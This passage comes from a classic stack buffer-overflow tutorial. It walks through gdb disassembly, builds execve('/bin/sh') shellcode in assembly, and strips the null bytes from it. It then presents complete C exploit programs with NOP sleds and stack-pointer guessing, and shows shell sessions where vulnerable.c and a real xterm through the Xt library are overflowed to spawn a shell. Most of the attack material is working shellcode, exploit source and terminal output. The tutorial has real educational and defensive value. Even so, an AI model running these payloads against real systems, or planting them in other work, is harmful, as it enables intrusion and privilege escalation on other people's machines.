of it under certain conditions; type \"show copying\" to see the conditions. There is absolutely no warranty for GDB; type \"show warranty\" for details. GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc... (no debugging symbols found)... (gdb) disassemble main Dump of assembler code for function main: 0x8000490 <main>: pushl %ebp 0x8000491 <main+1>: movl %esp,%ebp 0x8000493 <main+3>: subl $0x4,%esp 0x8000496 <main+6>: movl $0x0,0xfffffffc(%ebp) 0x800049d <main+13>: pushl $0x3 0x800049f <main+15>: pushl $0x2 0x80004a1 <main+17>: pushl $0x1 0x80004a3 <main+19>: call 0x8000470 <function> 0x80004a8 <main+24>: addl $0xc,%esp 0x80004ab <main+27>: movl $0x1,0xfffffffc(%ebp) 0x80004b2 <main+34>: movl 0xfffffffc(%ebp),%eax 0x80004b5 <main+37>: pushl %eax 0x80004b6 <main+38>: pushl $0x80004f8 0x80004bb <main+43>: call 0x8000378 <printf> 0x80004c0 <main+48>: addl $0x8,%esp 0x80004c3 <main+51>: movl %ebp,%esp 0x80004c5 <main+53>: popl %ebp 0x80004c6 <main+54>: ret 0x80004c7 <main+55>: nop ------------------------------------------------------------------------------ We can see that when calling function() the RET will be 0x8004a8, and we want to jump past the assignment at 0x80004ab. The next instruction we want to execute is the at 0x8004b2. A little math tells us the distance is 8 bytes. Shell Code ~~~~~~~~~~ So now that we know that we can modify the return address and the flow of execution, what program do we want to execute? In most cases we'll simply want the program to spawn a shell. From the shell we can then issue other commands as we wish. But what if there is no such code in the program we are trying to exploit? How can we place arbitrary instruction into its address space? The answer is to place the code with are trying to execute in the buffer we are overflowing, and overwrite the return address so it points back into the buffer. Assuming the stack starts at address 0xFF, and that S stands for the code we want to execute the stack would then look like this: bottom of DDDDDDDDEEEEEEEEEEEE EEEE FFFF FFFF FFFF FFFF top of memory 89ABCDEF0123456789AB CDEF 0123 4567 89AB CDEF memory buffer sfp ret a b c <------ [SSSSSSSSSSSSSSSSSSSS][SSSS][0xD8][0x01][0x02][0x03] ^ | |____________________________| top of bottom of stack stack The code to spawn a shell in C looks like: shellcode.c ----------------------------------------------------------------------------- #include <stdio.h> void main() { char *name[2]; name[0] = \"/bin/sh\"; name[1] = NULL; execve(name[0], name, NULL); } ------------------------------------------------------------------------------ To find out what does it looks like in assembly we compile it, and start up gdb. Remember to use the -static flag. Otherwise the actual code the for the execve system call will not be included. Instead there will be a reference to dynamic C library that would normally would be linked in at load time. ------------------------------------------------------------------------------ [aleph1]$ gcc -o shellcode -ggdb -static shellcode.c [aleph1]$ gdb shellcode GDB is free software and you are welcome to distribute copies of it under certain conditions; type \"show copying\" to see the conditions. There is absolutely no warranty for GDB; type \"show warranty\" for details. GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc... (gdb) disassemble main Dump of assembler code for function main: 0x8000130 <main>: pushl %ebp 0x8000131 <main+1>: movl %esp,%ebp 0x8000133 <main+3>: subl $0x8,%esp 0x8000136 <main+6>: movl $0x80027b8,0xfffffff8(%ebp) 0x800013d <main+13>: movl $0x0,0xfffffffc(%ebp) 0x8000144 <main+20>: pushl $0x0 0x8000146 <main+22>: leal 0xfffffff8(%ebp),%eax 0x8000149 <main+25>: pushl %eax 0x800014a <main+26>: movl 0xfffffff8(%ebp),%eax 0x800014d <main+29>: pushl %eax 0x800014e <main+30>: call 0x80002bc <__execve> 0x8000153 <main+35>: addl $0xc,%esp 0x8000156 <main+38>: movl %ebp,%esp 0x8000158 <main+40>: popl %ebp 0x8000159 <main+41>: ret End of assembler dump. (gdb) disassemble __execve Dump of assembler code for function __execve: 0x80002bc <__execve>: pushl %ebp 0x80002bd <__execve+1>: movl %esp,%ebp 0x80002bf <__execve+3>: pushl %ebx 0x80002c0 <__execve+4>: movl $0xb,%eax 0x80002c5 <__execve+9>: movl 0x8(%ebp),%ebx 0x80002c8 <__execve+12>: movl 0xc(%ebp),%ecx 0x80002cb <__execve+15>: movl 0x10(%ebp),%edx 0x80002ce <__execve+18>: int $0x80 0x80002d0 <__execve+20>: movl %eax,%edx 0x80002d2 <__execve+22>: testl %edx,%edx 0x80002d4 <__execve+24>: jnl 0x80002e6 <__execve+42> 0x80002d6 <__execve+26>: negl %edx 0x80002d8 <__execve+28>: pushl %edx 0x80002d9 <__execve+29>: call 0x8001a34 <__normal_errno_location> 0x80002de <__execve+34>: popl %edx 0x80002df <__execve+35>: movl %edx,(%eax) 0x80002e1 <__execve+37>: movl $0xffffffff,%eax 0x80002e6 <__execve+42>: popl %ebx 0x80002e7 <__execve+43>: movl %ebp,%esp 0x80002e9 <__execve+45>: popl %ebp 0x80002ea <__execve+46>: ret 0x80002eb <__execve+47>: nop End of assembler dump. ------------------------------------------------------------------------------ Lets try to understand what is going on here. We'll start by studying main: ------------------------------------------------------------------------------ 0x8000130 <main>: pushl %ebp 0x8000131 <main+1>: movl %esp,%ebp 0x8000133 <main+3>: subl $0x8,%esp This is the procedure prelude. It first saves the old frame pointer, makes the current stack pointer the new frame pointer, and leaves space for the local variables. In this case its: char *name[2]; or 2 pointers to a char. Pointers are a word long, so it leaves space for two words (8 bytes). 0x8000136 <main+6>: movl $0x80027b8,0xfffffff8(%ebp) We copy the value 0x80027b8 (the address of the string \"/bin/sh\") into the first pointer of name[]. This is equivalent to: name[0] = \"/bin/sh\"; 0x800013d <main+13>: movl $0x0,0xfffffffc(%ebp) We copy the value 0x0 (NULL) into the seconds pointer of name[]. This is equivalent to: name[1] = NULL; The actual call to execve() starts here. 0x8000144 <main+20>: pushl $0x0 We push the arguments to execve() in reverse order onto the stack. We start with NULL. 0x8000146 <main+22>: leal 0xfffffff8(%ebp),%eax We load the address of name[] into the EAX register. 0x8000149 <main+25>: pushl %eax We push the address of name[] onto the stack. 0x800014a <main+26>: movl 0xfffffff8(%ebp),%eax We load the address of the string \"/bin/sh\" into the EAX register. 0x800014d <main+29>: pushl %eax We push the address of the string \"/bin/sh\" onto the stack. 0x800014e <main+30>: call 0x80002bc <__execve> Call the library procedure execve(). The call instruction pushes the IP onto the stack. ------------------------------------------------------------------------------ Now execve(). Keep in mind we are using a Intel based Linux system. The syscall details will change from OS to OS, and from CPU to CPU. Some will pass the arguments on the stack, others on the registers. Some use a software interrupt to jump to kernel mode, others use a far call. Linux passes its arguments to the system call on the registers, and uses a software interrupt to jump into kernel mode. ------------------------------------------------------------------------------ 0x80002bc <__execve>: pushl %ebp 0x80002bd <__execve+1>: movl %esp,%ebp 0x80002bf <__execve+3>: pushl %ebx The procedure prelude. 0x80002c0 <__execve+4>: movl $0xb,%eax Copy 0xb (11 decimal) onto the stack. This is the index into the syscall table. 11 is execve. 0x80002c5 <__execve+9>: movl 0x8(%ebp),%ebx Copy the address of \"/bin/sh\" into EBX. 0x80002c8 <__execve+12>: movl 0xc(%ebp),%ecx Copy the address of name[] into ECX. 0x80002cb <__execve+15>: movl 0x10(%ebp),%edx Copy the address of the null pointer into %edx. 0x80002ce <__execve+18>: int $0x80 Change into kernel mode. ------------------------------------------------------------------------------ So as we can see there is not much to the execve() system call. All we need to do is: a) Have the null terminated string \"/bin/sh\" somewhere in memory. b) Have the address of the string \"/bin/sh\" somewhere in memory followed by a null long word. c) Copy 0xb into the EAX register. d) Copy the address of the address of the string \"/bin/sh\" into the EBX register. e) Copy the address of the string \"/bin/sh\" into the ECX register. f) Copy the address of the null long word into the EDX register. g) Execute the int $0x80 instruction. But what if the execve() call fails for some reason? The program will continue fetching instructions from the stack, which may contain random data! The program will most likely core dump. We want the program to exit cleanly if the execve syscall fails. To accomplish this we must then add a exit syscall after the execve syscall. What does the exit syscall looks like? exit.c ------------------------------------------------------------------------------ #include <stdlib.h> void main() { exit(0); } ------------------------------------------------------------------------------ ------------------------------------------------------------------------------ [aleph1]$ gcc -o exit -static exit.c [aleph1]$ gdb exit GDB is free software and you are welcome to distribute copies of it under certain conditions; type \"show copying\" to see the conditions. There is absolutely no warranty for GDB; type \"show warranty\" for details. GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc... (no debugging symbols found)... (gdb) disassemble _exit Dump of assembler code for function _exit: 0x800034c <_exit>: pushl %ebp 0x800034d <_exit+1>: movl %esp,%ebp 0x800034f <_exit+3>: pushl %ebx 0x8000350 <_exit+4>: movl $0x1,%eax 0x8000355 <_exit+9>: movl 0x8(%ebp),%ebx 0x8000358 <_exit+12>: int $0x80 0x800035a <_exit+14>: movl 0xfffffffc(%ebp),%ebx 0x800035d <_exit+17>: movl %ebp,%esp 0x800035f <_exit+19>: popl %ebp 0x8000360 <_exit+20>: ret 0x8000361 <_exit+21>: nop 0x8000362 <_exit+22>: nop 0x8000363 <_exit+23>: nop End of assembler dump. ------------------------------------------------------------------------------ The exit syscall will place 0x1 in EAX, place the exit code in EBX, and execute \"int 0x80\". That's it. Most applications return 0 on exit to indicate no errors. We will place 0 in EBX. Our list of steps is now: a) Have the null terminated string \"/bin/sh\" somewhere in memory. b) Have the address of the string \"/bin/sh\" somewhere in memory followed by a null long word. c) Copy 0xb into the EAX register. d) Copy the address of the address of the string \"/bin/sh\" into the EBX register. e) Copy the address of the string \"/bin/sh\" into the ECX register. f) Copy the address of the null long word into the EDX register. g) Execute the int $0x80 instruction. h) Copy 0x1 into the EAX register. i) Copy 0x0 into the EBX register. j) Execute the int $0x80 instruction. Trying to put this together in assembly language, placing the string after the code, and remembering we will place the address of the string, and null word after the array, we have: ------------------------------------------------------------------------------ movl string_addr,string_addr_addr movb $0x0,null_byte_addr movl $0x0,null_addr movl $0xb,%eax movl string_addr,%ebx leal string_addr,%ecx leal null_string,%edx int $0x80 movl $0x1, %eax movl $0x0, %ebx int $0x80 /bin/sh string goes here. ------------------------------------------------------------------------------ The problem is that we don't know where in the memory space of the program we are trying to exploit the code (and the string that follows it) will be placed. One way around it is to use a JMP, and a CALL instruction. The JMP and CALL instructions can use IP relative addressing, which means we can jump to an offset from the current IP without needing to know the exact address of where in memory we want to jump to. If we place a CALL instruction right before the \"/bin/sh\" string, and a JMP instruction to it, the strings address will be pushed onto the stack as the return address when CALL is executed. All we need then is to copy the return address into a register. The CALL instruction can simply call the start of our code above. Assuming now that J stands for the JMP instruction, C for the CALL instruction, and s for the string, the execution flow would now be: bottom of DDDDDDDDEEEEEEEEEEEE EEEE FFFF FFFF FFFF FFFF top of memory 89ABCDEF0123456789AB CDEF 0123 4567 89AB CDEF memory buffer sfp ret a b c <------ [JJSSSSSSSSSSSSSSCCss][ssss][0xD8][0x01][0x02][0x03] ^|^ ^| | |||_____________||____________| (1) (2) ||_____________|| |______________| (3) top of bottom of stack stack With this modifications, using indexed addressing, and writing down how many bytes each instruction takes our code looks like: ------------------------------------------------------------------------------ jmp offset-to-call # 2 bytes popl %esi # 1 byte movl %esi,array-offset(%esi) # 3 bytes movb $0x0,nullbyteoffset(%esi)# 4 bytes movl $0x0,null-offset(%esi) # 7 bytes movl $0xb,%eax # 5 bytes movl %esi,%ebx # 2 bytes leal array-offset,(%esi),%ecx # 3 bytes leal null-offset(%esi),%edx # 3 bytes int $0x80 # 2 bytes movl $0x1, %eax # 5 bytes movl $0x0, %ebx # 5 bytes int $0x80 # 2 bytes call offset-to-popl # 5 bytes /bin/sh string goes here. ------------------------------------------------------------------------------ Calculating the offsets from jmp to call, from call to popl, from the string address to the array, and from the string address to the null long word, we now have: ------------------------------------------------------------------------------ jmp 0x26 # 2 bytes popl %esi # 1 byte movl %esi,0x8(%esi) # 3 bytes movb $0x0,0x7(%esi) # 4 bytes movl $0x0,0xc(%esi) # 7 bytes movl $0xb,%eax # 5 bytes movl %esi,%ebx # 2 bytes leal 0x8(%esi),%ecx # 3 bytes leal 0xc(%esi),%edx # 3 bytes int $0x80 # 2 bytes movl $0x1, %eax # 5 bytes movl $0x0, %ebx # 5 bytes int $0x80 # 2 bytes call -0x2b # 5 bytes .string \\\"/bin/sh\\\" # 8 bytes ------------------------------------------------------------------------------ Looks good. To make sure it works correctly we must compile it and run it. But there is a problem. Our code modifies itself, but most operating system mark code pages read-only. To get around this restriction we must place the code we wish to execute in the stack or data segment, and transfer control to it. To do so we will place our code in a global array in the data segment. We need first a hex representation of the binary code. Lets compile it first, and then use gdb to obtain it. shellcodeasm.c ------------------------------------------------------------------------------ void main() { __asm__(\" jmp 0x2a # 3 bytes popl %esi # 1 byte movl %esi,0x8(%esi) # 3 bytes movb $0x0,0x7(%esi) # 4 bytes movl $0x0,0xc(%esi) # 7 bytes movl $0xb,%eax # 5 bytes movl %esi,%ebx # 2 bytes leal 0x8(%esi),%ecx # 3 bytes leal 0xc(%esi),%edx # 3 bytes int $0x80 # 2 bytes movl $0x1, %eax # 5 bytes movl $0x0, %ebx # 5 bytes int $0x80 # 2 bytes call -0x2f # 5 bytes .string \\\"/bin/sh\\\" # 8 bytes \"); } ------------------------------------------------------------------------------ ------------------------------------------------------------------------------ [aleph1]$ gcc -o shellcodeasm -g -ggdb shellcodeasm.c [aleph1]$ gdb shellcodeasm GDB is free software and you are welcome to distribute copies of it under certain conditions; type \"show copying\" to see the conditions. There is absolutely no warranty for GDB; type \"show warranty\" for details. GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc... (gdb) disassemble main Dump of assembler code for function main: 0x8000130 <main>: pushl %ebp 0x8000131 <main+1>: movl %esp,%ebp 0x8000133 <main+3>: jmp 0x800015f <main+47> 0x8000135 <main+5>: popl %esi 0x8000136 <main+6>: movl %esi,0x8(%esi) 0x8000139 <main+9>: movb $0x0,0x7(%esi) 0x800013d <main+13>: movl $0x0,0xc(%esi) 0x8000144 <main+20>: movl $0xb,%eax 0x8000149 <main+25>: movl %esi,%ebx 0x800014b <main+27>: leal 0x8(%esi),%ecx 0x800014e <main+30>: leal 0xc(%esi),%edx 0x8000151 <main+33>: int $0x80 0x8000153 <main+35>: movl $0x1,%eax 0x8000158 <main+40>: movl $0x0,%ebx 0x800015d <main+45>: int $0x80 0x800015f <main+47>: call 0x8000135 <main+5> 0x8000164 <main+52>: das 0x8000165 <main+53>: boundl 0x6e(%ecx),%ebp 0x8000168 <main+56>: das 0x8000169 <main+57>: jae 0x80001d3 <__new_exitfn+55> 0x800016b <main+59>: addb %cl,0x55c35dec(%ecx) End of assembler dump. (gdb) x/bx main+3 0x8000133 <main+3>: 0xeb (gdb) 0x8000134 <main+4>: 0x2a (gdb) . . . ------------------------------------------------------------------------------ testsc.c ------------------------------------------------------------------------------ char shellcode[] = \"\\xeb\\x2a\\x5e\\x89\\x76\\x08\\xc6\\x46\\x07\\x00\\xc7\\x46\\x0c\\x00\\x00\\x00\" \"\\x00\\xb8\\x0b\\x00\\x00\\x00\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\" \"\\xb8\\x01\\x00\\x00\\x00\\xbb\\x00\\x00\\x00\\x00\\xcd\\x80\\xe8\\xd1\\xff\\xff\" \"\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x00\\x89\\xec\\x5d\\xc3\"; void main() { int *ret; ret = (int *)&ret + 2; (*ret) = (int)shellcode; } ------------------------------------------------------------------------------ ------------------------------------------------------------------------------ [aleph1]$ gcc -o testsc testsc.c [aleph1]$ ./testsc $ exit [aleph1]$ ------------------------------------------------------------------------------ It works! But there is an obstacle. In most cases we'll be trying to overflow a character buffer. As such any null bytes in our shellcode will be considered the end of the string, and the copy will be terminated. There must be no null bytes in the shellcode for the exploit to work. Let's try to eliminate the bytes (and at the same time make it smaller). Problem instruction: Substitute with: -------------------------------------------------------- movb $0x0,0x7(%esi) xorl %eax,%eax molv $0x0,0xc(%esi) movb %eax,0x7(%esi) movl %eax,0xc(%esi) -------------------------------------------------------- movl $0xb,%eax movb $0xb,%al -------------------------------------------------------- movl $0x1, %eax xorl %ebx,%ebx movl $0x0, %ebx movl %ebx,%eax inc %eax -------------------------------------------------------- Our improved code: shellcodeasm2.c ------------------------------------------------------------------------------ void main() { __asm__(\" jmp 0x1f # 2 bytes popl %esi # 1 byte movl %esi,0x8(%esi) # 3 bytes xorl %eax,%eax # 2 bytes movb %eax,0x7(%esi) # 3 bytes movl %eax,0xc(%esi) # 3 bytes movb $0xb,%al # 2 bytes movl %esi,%ebx # 2 bytes leal 0x8(%esi),%ecx # 3 bytes leal 0xc(%esi),%edx # 3 bytes int $0x80 # 2 bytes xorl %ebx,%ebx # 2 bytes movl %ebx,%eax # 2 bytes inc %eax # 1 bytes int $0x80 # 2 bytes call -0x24 # 5 bytes .string \\\"/bin/sh\\\" # 8 bytes # 46 bytes total \"); } ------------------------------------------------------------------------------ And our new test program: testsc2.c ------------------------------------------------------------------------------ char shellcode[] = \"\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\" \"\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\" \"\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh\"; void main() { int *ret; ret = (int *)&ret + 2; (*ret) = (int)shellcode; } ------------------------------------------------------------------------------ ------------------------------------------------------------------------------ [aleph1]$ gcc -o testsc2 testsc2.c [aleph1]$ ./testsc2 $ exit [aleph1]$ ------------------------------------------------------------------------------ Writing an Exploit ~~~~~~~~~~~~~~~~~~ (or how to mung the stack) ~~~~~~~~~~~~~~~~~~~~~~~~~~ Lets try to pull all our pieces together. We have the shellcode. We know it must be part of the string which we'll use to overflow the buffer. We know we must point the return address back into the buffer. This example will demonstrate these points: overflow1.c ------------------------------------------------------------------------------ char shellcode[] = \"\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\" \"\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\" \"\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh\"; char large_string[128]; void main() { char buffer[96]; int i; long *long_ptr = (long *) large_string; for (i = 0; i < 32; i++) *(long_ptr + i) = (int) buffer; for (i = 0; i < strlen(shellcode); i++) large_string[i] = shellcode[i]; strcpy(buffer,large_string); } ------------------------------------------------------------------------------ ------------------------------------------------------------------------------ [aleph1]$ gcc -o exploit1 exploit1.c [aleph1]$ ./exploit1 $ exit exit [aleph1]$ ------------------------------------------------------------------------------ What we have done above is filled the array large_string[] with the address of buffer[], which is where our code will be. Then we copy our shellcode into the beginning of the large_string string. strcpy() will then copy large_string onto buffer without doing any bounds checking, and will overflow the return address, overwriting it with the address where our code is now located. Once we reach the end of main and it tried to return it jumps to our code, and execs a shell. The problem we are faced when trying to overflow the buffer of another program is trying to figure out at what address the buffer (and thus our code) will be. The answer is that for every program the stack will start at the same address. Most programs do not push more than a few hundred or a few thousand bytes into the stack at any one time. Therefore by knowing where the stack starts we can try to guess where the buffer we are trying to overflow will be. Here is a little program that will print its stack pointer: sp.c ------------------------------------------------------------------------------ unsigned long get_sp(void) { __asm__(\"movl %esp,%eax\"); } void main() { printf(\"0x%x\\n\", get_sp()); } ------------------------------------------------------------------------------ ------------------------------------------------------------------------------ [aleph1]$ ./sp 0x8000470 [aleph1]$ ------------------------------------------------------------------------------ Lets assume this is the program we are trying to overflow is: vulnerable.c ------------------------------------------------------------------------------ void main(int argc, char *argv[]) { char buffer[512]; if (argc > 1) strcpy(buffer,argv[1]); } ------------------------------------------------------------------------------ We can create a program that takes as a parameter a buffer size, and an offset from its own stack pointer (where we believe the buffer we want to overflow may live). We'll put the overflow string in an environment variable so it is easy to manipulate: exploit2.c ------------------------------------------------------------------------------ #include <stdlib.h> #define DEFAULT_OFFSET 0 #define DEFAULT_BUFFER_SIZE 512 char shellcode[] = \"\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\" \"\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\" \"\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh\"; unsigned long get_sp(void) { __asm__(\"movl %esp,%eax\"); } void main(int argc, char *argv[]) { char *buff, *ptr; long *addr_ptr, addr; int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE; int i; if (argc > 1) bsize = atoi(argv[1]); if (argc > 2) offset = atoi(argv[2]); if (!(buff = malloc(bsize))) { printf(\"Can't allocate memory.\\n\"); exit(0); } addr = get_sp() - offset; printf(\"Using address: 0x%x\\n\", addr); ptr = buff; addr_ptr = (long *) ptr; for (i = 0; i < bsize; i+=4) *(addr_ptr++) = addr; ptr += 4; for (i = 0; i < strlen(shellcode); i++) *(ptr++) = shellcode[i]; buff[bsize - 1] = '\\0'; memcpy(buff,\"EGG=\",4); putenv(buff); system(\"/bin/bash\"); } ------------------------------------------------------------------------------ Now we can try to guess what the buffer and offset should be: ------------------------------------------------------------------------------ [aleph1]$ ./exploit2 500 Using address: 0xbffffdb4 [aleph1]$ ./vulnerable $EGG [aleph1]$ exit [aleph1]$ ./exploit2 600 Using address: 0xbffffdb4 [aleph1]$ ./vulnerable $EGG Illegal instruction [aleph1]$ exit [aleph1]$ ./exploit2 600 100 Using address: 0xbffffd4c [aleph1]$ ./vulnerable $EGG Segmentation fault [aleph1]$ exit [aleph1]$ ./exploit2 600 200 Using address: 0xbffffce8 [aleph1]$ ./vulnerable $EGG Segmentation fault [aleph1]$ exit . . . [aleph1]$ ./exploit2 600 1564 Using address: 0xbffff794 [aleph1]$ ./vulnerable $EGG $ ------------------------------------------------------------------------------ As we can see this is not an efficient process. Trying to guess the offset even while knowing where the beginning of the stack lives is nearly impossible. We would need at best a hundred tries, and at worst a couple of thousand. The problem is we need to guess *exactly* where the address of our code will start. If we are off by one byte more or less we will just get a segmentation violation or a invalid instruction. One way to increase our chances is to pad the front of our overflow buffer with NOP instructions. Almost all processors have a NOP instruction that performs a null operation. It is usually used to delay execution for purposes of timing. We will take advantage of it and fill half of our overflow buffer with them. We will place our shellcode at the center, and then follow it with the return addresses. If we are lucky and the return address points anywhere in the string of NOPs, they will just get executed until they reach our code. In the Intel architecture the NOP instruction is one byte long and it translates to 0x90 in machine code. Assuming the stack starts at address 0xFF, that S stands for shell code, and that N stands for a NOP instruction the new stack would look like this: bottom of DDDDDDDDEEEEEEEEEEEE EEEE FFFF FFFF FFFF FFFF top of memory 89ABCDEF0123456789AB CDEF 0123 4567 89AB CDEF memory buffer sfp ret a b c <------ [NNNNNNNNNNNSSSSSSSSS][0xDE][0xDE][0xDE][0xDE][0xDE] ^ | |_____________________| top of bottom of stack stack The new exploits is then: exploit3.c ------------------------------------------------------------------------------ #include <stdlib.h> #define DEFAULT_OFFSET 0 #define DEFAULT_BUFFER_SIZE 512 #define NOP 0x90 char shellcode[] = \"\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\" \"\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\" \"\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh\"; unsigned long get_sp(void) { __asm__(\"movl %esp,%eax\"); } void main(int argc, char *argv[]) { char *buff, *ptr; long *addr_ptr, addr; int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE; int i; if (argc > 1) bsize = atoi(argv[1]); if (argc > 2) offset = atoi(argv[2]); if (!(buff = malloc(bsize))) { printf(\"Can't allocate memory.\\n\"); exit(0); } addr = get_sp() - offset; printf(\"Using address: 0x%x\\n\", addr); ptr = buff; addr_ptr = (long *) ptr; for (i = 0; i < bsize; i+=4) *(addr_ptr++) = addr; for (i = 0; i < bsize/2; i++) buff[i] = NOP; ptr = buff + ((bsize/2) - (strlen(shellcode)/2)); for (i = 0; i < strlen(shellcode); i++) *(ptr++) = shellcode[i]; buff[bsize - 1] = '\\0'; memcpy(buff,\"EGG=\",4); putenv(buff); system(\"/bin/bash\"); } ------------------------------------------------------------------------------ A good selection for our buffer size is about 100 bytes more than the size of the buffer we are trying to overflow. This will place our code at the end of the buffer we are trying to overflow, giving a lot of space for the NOPs, but still overwriting the return address with the address we guessed. The buffer we are trying to overflow is 512 bytes long, so we'll use 612. Let's try to overflow our test program with our new exploit: ------------------------------------------------------------------------------ [aleph1]$ ./exploit3 612 Using address: 0xbffffdb4 [aleph1]$ ./vulnerable $EGG $ ------------------------------------------------------------------------------ Whoa! First try! This change has improved our chances a hundredfold. Let's try it now on a real case of a buffer overflow. We'll use for our demonstration the buffer overflow on the Xt library. For our example, we'll use xterm (all programs linked with the Xt library are vulnerable). You must be running an X server and allow connections to it from the localhost. Set your DISPLAY variable accordingly. ------------------------------------------------------------------------------ [aleph1]$ export DISPLAY=:0.0 [aleph1]$ ./exploit3 1124 Using address: 0xbffffdb4 [aleph1]$ /usr/X11R6/bin/xterm -fg $EGG Warning: Color name \"\u00eb^1\u00a4FF \u00b0 \u00f3V \u00a41\u00a4\u00d8@\u00a4\u00e8\u00dc\u00ff\u00ff\u00ff/bin/sh\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4 \u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4